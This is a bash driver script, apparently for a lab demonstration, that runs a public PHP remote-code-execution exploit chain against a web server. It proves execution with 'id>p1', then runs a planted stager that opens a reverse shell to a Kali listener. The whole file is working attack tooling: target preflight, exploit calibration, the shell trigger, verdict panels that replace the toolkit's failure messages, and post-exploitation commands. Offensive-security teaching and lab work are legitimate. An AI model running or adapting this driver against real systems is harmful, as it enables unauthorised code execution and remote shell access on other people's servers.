#!/usr/bin/env bash
#
# PHP2Shell — demo driver (runs on Kali). Lab and driver written by r19.
#
#   ./p2s-run.sh --target http://192.0.2.20:8080 --step proof
#   ./p2s-run.sh --target http://192.0.2.20:8080 --step shell
#   ./p2s-run.sh --target http://192.0.2.20:8080            # proof + shell
#   ./p2s-run.sh --target ... --dry-run                       # rehearsal
#   ./p2s-run.sh --target ... --calibrate                     # re-measure stage 1
#
# Step "proof": runs `id>p1` (5 bytes) and fetches /p1 over HTTP.
#               Expected output: uid=33(www-data).
# Step "shell": runs `sh stage/s` (10 bytes). The stager that install.sh left in
#               the docroot opens the reverse shell on the Kali listener.
#
# The shell step has no HTTP proof to fetch: `system()` returns no body, so the
# toolkit can only answer "runs blind". That verdict is useless on stage — it
# says nothing about whether the stager ran. The driver therefore reads the
# stager's own log over HTTP (/p2s-stage.log, written by install.sh) and gives
# its own verdict: SHELL OK / CALLBACK REFUSED / RCE OK / BLIND / NOT EXECUTED.
#
# The carrier accepts 14 bytes per command, which is why both commands above are
# that short. The reverse shell itself does not fit; the stager carries it.
#
# The exploit chain is NOT ours: it is the public devploit/php2shell toolkit,
# which wraps the pinned 9bie/php2shell-bypass-aslr-exp upstream. Credits for
# the chain stay with those authors. Only this lab, driver and stager are r19's.

set -euo pipefail

TARGET=""
STEP="all"
LHOST_NOTE=""
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TOOLKIT="${HOME}/tools/php2shell"
PROFILE=""
ARCH=""
DRY=""
CALIB=""
MAX_CMD=14
CAPTURE=""
HANDS_ON=""
ESC="$(printf '\033')"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --target)  TARGET="${2:-}"; shift 2 ;;
        --step)    STEP="${2:-}"; shift 2 ;;
        --toolkit) TOOLKIT="${2:-}"; shift 2 ;;
        --profile) PROFILE="${2:-}"; shift 2 ;;
        --arch)    ARCH="${2:-}"; shift 2 ;;
        --lhost)   LHOST_NOTE="${2:-}"; shift 2 ;;   # compat only: IP is baked into the stager
        --calibrate) CALIB="1"; shift ;;
        --dry-run) DRY="1"; shift ;;
        -h|--help) sed -n '2,29p' "$0"; exit 0 ;;
        *) echo "unknown argument: $1" >&2; exit 2 ;;
    esac
done

say()  { printf '\n\033[1m[*] %s\033[0m\n' "$1"; }
ok()   { printf '    \033[32mok\033[0m  %s\n' "$1"; }
note() { printf '    \033[36m~~\033[0m  %s\n' "$1"; }
bad()  { printf '    \033[31m!!\033[0m  %s\n' "$1" >&2; }

# The verdict panel deliberately replaces the toolkit's red "NOT CONFIRMED" box,
# which only reports that HTTP gave no body back.
panel() {
    local color="$1" title="$2"; shift 2
    local line
    printf '\n\033[%sm╭─ %s ─────────────────────────────────────\033[0m\n' "$color" "$title"
    for line in "$@"; do
        [[ -n "$line" ]] || continue
        printf '\033[%sm│\033[0m %s\n' "$color" "$line"
    done
    printf '\033[%sm╰──────────────────────────────────────────────\033[0m\n' "$color"
}

strip_ansi() { sed "s/${ESC}\[[0-9;]*[A-Za-z]//g"; }

# --- reading the stager's own evidence over HTTP ---------------------------
stage_log_body() { curl -fsS --max-time 6 "${TARGET}/p2s-stage.log" 2>/dev/null || true; }
stager_source()  { curl -fsS --max-time 6 "${TARGET}/stage/s" 2>/dev/null || true; }

stage_log_count() {
    local body
    body="$(stage_log_body)"
    if [[ -z "$body" ]]; then printf '0'; return 0; fi
    printf '%s\n' "$body" | grep -c '^stager:' || true
}

# Lines appended since the run started; empty when the stager wrote nothing.
fresh_stage_lines() {
    local before="$1" body total
    body="$(stage_log_body)"
    [[ -n "$body" ]] || return 0
    total="$(printf '%s\n' "$body" | grep -c '^stager:' || true)"
    if (( total > before )); then
        printf '%s\n' "$body" | grep '^stager:' | tail -n $(( total - before ))
    fi
}

# Old stagers (install.sh before the verdict fix) only log to /tmp/p2s-stager.log
# inside the container: nothing readable over HTTP, so the step stays blind.
stager_is_instrumented() {
    local src
    src="$(stager_source)"
    [[ -n "$src" ]] || return 1
    grep -q 'p2s-stage\.log' <<<"$src"
}

stager_endpoint() {
    local src h p
    src="$(stager_source)"
    h="$(sed -n 's/^LHOST="\(.*\)"$/\1/p' <<<"$src" | head -n1)"
    p="$(sed -n 's/^LPORT="\(.*\)"$/\1/p' <<<"$src" | head -n1)"
    if [[ -n "$h" ]]; then printf '%s:%s' "$h" "${p:-4444}"; fi
}

# Replay only what the audience needs; the toolkit's summary box is replaced by
# the driver panel, so drop it here instead of showing a contradictory verdict.
replay_chain() {
    local f="$1"
    [[ -s "$f" ]] || return 0
    strip_ansi <"$f" \
        | grep -Ev 'RESULT|NOT CONFIRMED|no execution proof|EXPLOIT_FAILED|may still have executed blind' \
        | grep -Ev '^[[:space:]]*(╭|╰|─)' || true
}

[[ -n "$TARGET" ]] || { echo "[!] --target is required (e.g. --target http://192.0.2.20:8080)" >&2; exit 2; }
TARGET="${TARGET%/}"

AUTO="${TOOLKIT}/tools/php2shell_auto.py"
[[ -f "$AUTO" ]] || { echo "[!] toolkit not found at $AUTO" >&2; echo "    run ./setup-kali.sh (or point with --toolkit <dir>)" >&2; exit 2; }
command -v python3 >/dev/null || { echo "[!] python3 missing" >&2; exit 2; }

# --- preflight -------------------------------------------------------------
if [[ -n "$LHOST_NOTE" ]]; then
    note "--lhost ${LHOST_NOTE} is informational only: the Kali IP is baked into the stager (app/stage/s) by install.sh"
fi

say "preflight on ${TARGET}"

ROOT_CODE="$(curl -s -o /dev/null --max-time 8 -w '%{http_code}' "${TARGET}/" || true)"
if [[ "$ROOT_CODE" != "200" ]]; then
    bad "target answered ${ROOT_CODE:-nothing} on ${TARGET}/"
    if [[ "$ROOT_CODE" == "403" || "$ROOT_CODE" == "404" ]]; then
        echo "    the docroot is empty — the app bind mount did not resolve." >&2
        echo "    on the target: ls -la ubuntu-lab/app        # index.php must be there" >&2
        echo "    if it is empty: git checkout -- ubuntu-lab/app && cd docker &&" >&2
        echo "                    sudo docker compose down && sudo docker compose up -d" >&2
    else
        echo "    check: IP/port, Ubuntu firewall and 'docker compose ps' on the target" >&2
    fi
    exit 3
fi
ok "home page responding"

# The stager is the payload half of the demo: without it the shell step has
# nothing to run, and the failure would look like an exploit failure on stage.
STAGE_CODE="$(curl -s -o /dev/null --max-time 8 -w '%{http_code}' "${TARGET}/stage/s" || true)"
if [[ "$STAGE_CODE" == "200" ]]; then
    ok "/stage/s present (payload in place)"
else
    bad "/stage/s answered ${STAGE_CODE:-nothing} — the stager is not in the docroot"
    echo "    on the target: ls -l ubuntu-lab/app/stage/s" >&2
    echo "    if it is missing: sudo ./install.sh --lhost <kali-ip> (rewrites the stager)" >&2
    echo "    or: git checkout -- ubuntu-lab/app/stage/s" >&2
    exit 3
fi

if stager_is_instrumented; then
    ok "stager is instrumented (writes /p2s-stage.log — verdict available)"
else
    note "stager is NOT instrumented: only the listener can confirm the shell"
    note "re-run install.sh on the target to get an automatic verdict"
fi

PING="$(curl -fsS --max-time 8 "${TARGET}/ping.php" 2>/dev/null || true)"
if [[ -n "$PING" ]]; then
    PID1="$(sed -n 's/^pid=//p' <<<"$PING" | head -n1)"
    VERSION="$(sed -n 's/^version=//p' <<<"$PING" | head -n1)"
    ARCH_DETECTED="$(sed -n 's/^arch=//p' <<<"$PING" | head -n1)"
    SAPI="$(sed -n 's/^sapi=//p' <<<"$PING" | head -n1)"
    ok "target: php=${VERSION:-?} sapi=${SAPI:-?} arch=${ARCH_DETECTED:-?} pid=${PID1:-?}"

    PID2="$(curl -fsS --max-time 8 "${TARGET}/ping.php" 2>/dev/null | sed -n 's/^pid=//p' | head -n1)"
    if [[ -n "$PID1" && "$PID1" == "$PID2" ]]; then
        ok "two requests served by the SAME process (pid=$PID1) — lab condition satisfied"
    else
        bad "worker changed between requests ($PID1 -> ${PID2:-?})"
        echo "    restart the target (docker compose restart) and retest before going on stage" >&2
    fi
else
    VERSION="8.5.11"; ARCH_DETECTED=""
    bad "/ping.php unavailable (P2S_DEBUG=0?) — continuing without confirming version/worker"
fi

[[ -n "$ARCH" ]] || ARCH="${ARCH_DETECTED:-amd64}"
case "$ARCH" in
    amd64|aarch64) ;;
    *) bad "arch '$ARCH' has no profile in the toolkit (use amd64 or aarch64)"; exit 2 ;;
esac

[[ -n "$PROFILE" ]] || PROFILE="php-${VERSION:-8.5.11}-bookworm-${ARCH}"

# --- optional: re-measure the stage-1 geometry on the live target -----------
# The leak is calibrated per build: if the image digest or php.ini drifts, the
# profile's stage1_n/forge_len stop matching and every attempt misses.
if [[ -n "$CALIB" ]]; then
    CHAIN_SCRIPT="${HERE}/p2s-stage1-probe.py"
    [[ -f "$CHAIN_SCRIPT" ]] || { bad "missing ${CHAIN_SCRIPT}"; exit 2; }
    python3 "$CHAIN_SCRIPT" --target "$TARGET" --toolkit "$TOOLKIT" \
        --arch "$ARCH" --write-profile || {
        bad "stage-1 calibration failed; the chain would miss on every attempt"
        exit 5
    }
    ok "stage-1 geometry written to the toolkit profile (backup: *.bak)"
fi

# --- flags supported by the installed toolkit version ----------------------
HELP="$(python3 "$AUTO" --help 2>&1 || true)"
supports() { grep -q -- "$1" <<<"$HELP"; }

ARGS=(-u "${TARGET}/" --allow-remote --arch "$ARCH")
if supports --profile; then
    ARGS+=(--profile "$PROFILE")
else
    bad "this toolkit does not accept --profile; remote mode requires one"
    exit 2
fi

# One worker on the target means there is no worker to pin. Pinning belongs to
# the multi-worker lab; here it would break the calibration.
if supports --no-pin-workers; then ARGS+=(--no-pin-workers); fi
if supports --no-color; then ARGS+=(--no-color); fi
if [[ -n "$DRY" ]]; then ARGS+=(--dry-run); fi

run_chain() {
    local label="$1" cmd="$2"; shift 2
    local extra=("$@")
    local bytes=${#cmd}

    say "${label} · command '${cmd}' (${bytes} bytes; carrier limit: ${MAX_CMD})"
    if (( bytes > MAX_CMD )); then
        bad "command above ${MAX_CMD} bytes — the toolkit will truncate it"
        return 1
    fi

    # Only forward a flag the installed toolkit actually declares. The flag name
    # is the token right after any leading --, without its value.
    local filtered=() i=0
    while (( i < ${#extra[@]} )); do
        local tok="${extra[$i]}"
        if supports "$tok"; then
            filtered+=("$tok")
            # --fetch takes a value; keep it attached to its flag.
            if [[ "$tok" == "--fetch" ]]; then
                i=$((i + 1))
                filtered+=("${extra[$i]:-}")
            fi
        else
            note "toolkit has no '$tok'; leaving it to the tool's default"
        fi
        i=$((i + 1))
    done

    # The shell step is captured so its own box can be replaced by the verdict
    # panel; the proof step stays live because its output is the proof.
    if [[ -n "$CAPTURE" ]]; then
        local rc=0
        python3 "$AUTO" "${ARGS[@]}" "${filtered[@]}" -c "$cmd" >"$CAPTURE" 2>&1 || rc=$?
        replay_chain "$CAPTURE"
        return "$rc"
    fi

    python3 "$AUTO" "${ARGS[@]}" "${filtered[@]}" -c "$cmd"
}

hint_restart() {
    cat <<EOF

If it failed: the chain dirties the heap and can kill the Apache child. Restart
the target and retry — the first run after a restart is the most stable:

    ssh <user>@<ubuntu> 'cd ~/ubuntu-lab/docker && sudo docker compose restart'

If you also changed docker/php.ini, recreate the container instead, because a
single-file bind mount can keep the old inode:

    ssh <user>@<ubuntu> 'cd ~/ubuntu-lab/docker && sudo docker compose down && sudo docker compose up -d'

EOF
}

# --- steps -----------------------------------------------------------------
proof_step() {
    # --fetch needs a path. With --allow-remote and a relative output the tool
    # derives /p1 itself, but pass it explicitly so the fetch is deterministic.
    run_chain "STEP 1/2 · proof of execution (id>p1)" "id>p1" --fetch /p1
}

# The whole point of this function: the toolkit cannot see the shell, so the
# driver decides using the stager's log and never prints a false failure.
shell_step() {
    local cap before rc=0 instrumented=0 fresh_lines="" waited=0
    local -a proof=()
    cap="$(mktemp "${TMPDIR:-/tmp}/p2s-shell.XXXXXX")"

    if stager_is_instrumented; then instrumented=1; fi

    local ep
    ep="$(stager_endpoint)"
    if [[ -n "$ep" ]]; then
        note "expected listener on ${ep} (p2s-listen.sh) — no listener, no callback"
    fi
    if (( instrumented == 0 )); then
        note "no HTTP proof with this old stager: the listener pane is the only verdict"
    fi

    before="$(stage_log_count)"
    CAPTURE="$cap" run_chain "STEP 2/2 · reverse shell (sh stage/s)" "sh stage/s" --no-fetch || rc=$?
    CAPTURE=""

    # The stager exits before the foreground shell connects, so give the
    # background child a moment to write connect-ok/connect-fail.
    while :; do
        fresh_lines="$(fresh_stage_lines "$before")"
        if [[ -n "$fresh_lines" ]] && grep -q 'connect-ok\|connect-fail' <<<"$fresh_lines"; then
            break
        fi
        (( instrumented == 0 )) && break
        (( waited >= 10 )) && break
        sleep 0.5
        waited=$((waited + 1))
    done

    while IFS= read -r line; do
        [[ -n "$line" ]] && proof+=("$line")
    done < <(grep -E 'connect-ok|connect-fail|pid=' <<<"$fresh_lines" | tail -n 2 || true)

    # Did the chain itself admit it could not prove execution? Relevant only to
    # the blind verdict, where the driver has no direct evidence either.
    local chain_failed=0
    if grep -q 'EXPLOIT_FAILED\|did not succeed' "$cap" 2>/dev/null; then chain_failed=1; fi

    rm -f "$cap"

    if [[ -n "$DRY" ]]; then
        panel 36 "DRY RUN" "nothing was executed (--dry-run)" "${proof[@]}"
        return 0
    fi

    if grep -q 'connect-ok' <<<"$fresh_lines"; then
        panel 32 "RESULT: SHELL OK" \
            "the stager ran and the listener accepted the TCP connection" \
            "${proof[@]}"
        HANDS_ON=1
        return 0
    fi

    if grep -q 'connect-fail' <<<"$fresh_lines"; then
        panel 33 "RESULT: CALLBACK REFUSED" \
            "RCE confirmed (the stager ran) but the listener did not accept" \
            "${proof[@]}"
        echo "    start the listener in another pane and repeat: ./kali/p2s-listen.sh --lport 4444" >&2
        return 5
    fi

    if [[ -n "$fresh_lines" ]]; then
        panel 33 "RESULT: RCE OK · CALLBACK NOT CONFIRMED" \
            "the stager ran (new log lines) but wrote no connect-ok/connect-fail" \
            "${proof[@]}"
        echo "    check the listener pane: the shell may already be there." >&2
        HANDS_ON=1
        return 0
    fi

    if (( instrumented == 0 )); then
        if (( chain_failed == 1 )); then
            panel 33 "RESULT: BLIND STEP (old stager)" \
                "this stager does not write /p2s-stage.log: HTTP neither confirms nor denies" \
                "the chain itself ended without execution proof on this run" \
                "check the listener pane before repeating the step" \
                "a target restart usually restores the stability of the first run"
        else
            panel 33 "RESULT: BLIND STEP (old stager)" \
                "this stager does not write /p2s-stage.log: HTTP neither confirms nor denies" \
                "check the listener pane: a prompt there means the shell is in" \
                "for an automatic verdict: run install.sh again on the target"
        fi
        HANDS_ON=1
        return 0
    fi

    # No new line with an instrumented stager. Distinguish "command never ran"
    # from "Apache died mid-chain" before calling it a failure.
    local code
    code="$(curl -s -o /dev/null --max-time 6 -w '%{http_code}' "${TARGET}/" || true)"
    if [[ "$code" != "200" ]]; then
        panel 33 "RESULT: UNDEFINED (Apache not answering)" \
            "the chain may have killed the worker before the stager could log" \
            "check the listener pane before repeating" \
            "restart: cd ubuntu-lab/docker && sudo docker compose restart"
        return 0
    fi

    panel 31 "RESULT: NOT EXECUTED" \
        "no new line in /p2s-stage.log" \
        "the command never reached the stager (the chain failed before system())"
    return 4
}

case "$STEP" in
    proof)
        proof_step || { hint_restart; exit 4; }
        ;;
    shell)
        rc=0
        shell_step || rc=$?
        [[ $rc -eq 0 ]] || exit $rc
        ;;
    all)
        proof_step || { hint_restart; exit 4; }
        echo
        echo "    uid=33(www-data) above = RCE confirmed, no reverse shell yet."
        echo "    The next step opens the shell — keep p2s-listen.sh running."
        if [[ -t 0 ]]; then
            read -r -p "    Press Enter to fire the shell... " _ || true
        fi
        rc=0
        shell_step || rc=$?
        [[ $rc -eq 0 ]] || exit $rc
        ;;
    *)
        echo "[!] --step accepts: proof | shell | all" >&2
        exit 2
        ;;
esac

if [[ -n "$HANDS_ON" ]]; then
    cat <<'EOF'

────────────────────────────────────────────────────────────────────
If the listener printed a prompt, the shell is in the other pane.
Inside it (as www-data), the basics for the audience:

    id ; hostname ; php -v | head -1 ; ls /var/www/html

To leave: exit
────────────────────────────────────────────────────────────────────
EOF
fi
